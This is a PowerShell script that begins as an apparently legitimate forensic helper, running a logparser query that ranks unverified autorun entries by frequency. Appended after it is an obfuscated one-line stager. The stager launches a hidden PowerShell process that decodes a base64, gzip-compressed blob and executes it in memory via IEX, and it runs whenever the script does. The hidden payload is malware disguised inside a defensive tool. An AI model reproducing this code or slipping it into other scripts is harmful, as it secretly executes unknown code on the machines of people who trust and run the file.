

if (Get-Command logparser.exe) {

    $lpquery = @"
    SELECT
        COUNT(ImagePath, LaunchString) as ct,
        ImagePath,
        LaunchString
    FROM
        *autorunsc.tsv
    WHERE
        Publisher not like '(Verified)%' and
        (ImagePath not like 'File not found%')
    GROUP BY
        ImagePath,
        LaunchString
    ORDER BY
        ct ASC
"@

    & logparser -stats:off -i:csv -dtlines:0 -fixedsep:on -rtp:-1 "$lpquery"

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAC84R1gCA7VWf2/aSBD9O5X6HawKybZKMBBSmkiVbo35lWACOJgAh04be20WFi+x1yHQ63e/MdgkvTZVrtJZidj1zOy+ffNmx14cOILyQHI8b7PQq9LX9+9OejjEK0nJOctxXsqta8PBVj05AUMuKqGyd36PpS+SMkXrtcFXmAazy8taHIYkEId5oUkEiiKyumeURIoq/S2N5iQkpzf3C+II6auU+6vQZPwes9RtW8POnEinKHATW4c7OEFVsNaMCkX+809ZnZ6WZoX6Q4xZpMjWNhJkVXAZk1Xpm5pseLtdE0U2qRPyiHuiMKLBWbkwDCLskS6s9khMIubcjWQVTgJ/IRFxGEjHMyWLHFwUGYa9kDvIdUMSQUShHTzyJVFyQcxYXvpDmaYIBnEg6IqAXZCQry0SPlKHRIUWDlxGBsSbKV2yyQ7+1iDlZRB49USo5iEhr0A1uRszcoiW1R/BJolU4TkmExj49v7d+3feMfvFi09+42a0m78UAIxOpvsxAaBKj0d07/1FKuYlE7bDgodbmOZuw5ioM2maJGE6m0m53aDlmKQzzL++RikLAPeInpnwampz6s4gJE1Rblseh1cVNjrvmI+J/XXJGcSjATG2AV5RJ1OV8jPyicfI/tSFzK0L4BQ5NRDXIIz4WCRU5qXpj2H1FRXHWD2mzCUhciCBEaCC3KrfgzlkR5HbgUlWwNdhLkMyPNAyybxT/W6z3ZM5OMk1hqMoL/ViKCYnL1kEM+LmJRRENDWhWPD9UH6Ga8ZMUAdHIltupv6bz3TfGg8iEcYOpBI4uLXWxKGYJZTkpRZ1ib61qJ/tL/+UkBpmjAY+rPQICYE3CRGWSAQSAtSjGNSCRUR7tWZkBX77Cm8w7EM9pxWxVxX2iSu/hjZT/UHiCT8ZMS+wQtItxkVesmko4MJIuE4U9vtQXlwX34GqhSRNlZLV1FTfiqQGcrtqaUAWiWpTxvb8hAK4aYR8peOIfKpYIgTmlA/aDa0heMbtgJmOvqQltKGltgn/Q3rW5kbVvb5atLTQeJp7qB21zVbP6Ldalccry64Iq94W1722MOt3i4WFWoPhWEzaqHVLi8txZbe+ojurg9zxk/Zpp+82Rf1pt/Bdb2x4nl/1rEHpvEE7o1pfL5Zxx6jHnZG+0YuVqE43rT4d9pdXDXE/thkeepp/V7rA9KkTLuwSN3dthJrzM2d35dnNueluxy3tYlRZojpCtaBuN3R+PdZD1NNs7Nv8mnSrg5EPZ7UmlEz6w4be7zd0NGwuHowLzYfYOzzXR3aZTtZ3gznMGwDhWitW2i7Z8XEfSGpyhP0B+Pi1sjP3wMf4iPSPXR6V8VLnSAefxuQBcI3XjR4D++2wzJHNuncYdSbbhqaVxr0KahXpqOmjZEns632MokdjZ2gl2+Xu6Lw79jT7jlU1o3a7djxN0zYt49qZlJ4+31Q/d0bUXnE01DT7Q6IQkEhubfpx/eKu+yLnr131Jg6jOWagBbi/sxpt8LCR3sg9TpMIRcn68pKEAWHQ0aDnZbpGjHEnaQwvrm9oTYeGMYNSHcLwrPzTkSodHdXnlpG9urycANykXvYiLnRI4It5vvh0VizC3V98qhTh0G8/ZI2vt0q6WD7pHkeunvdg+z3UpIZy2HzY3Axv70Xvf+cyLeE5/Lhv4/L53S+sb+K3mH/m4QfT9y/+E92/w8MIUwHOFlxHjBxa5q/oSFX04mvjOWegEy99km+/m1icduFT5B++f4+abAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

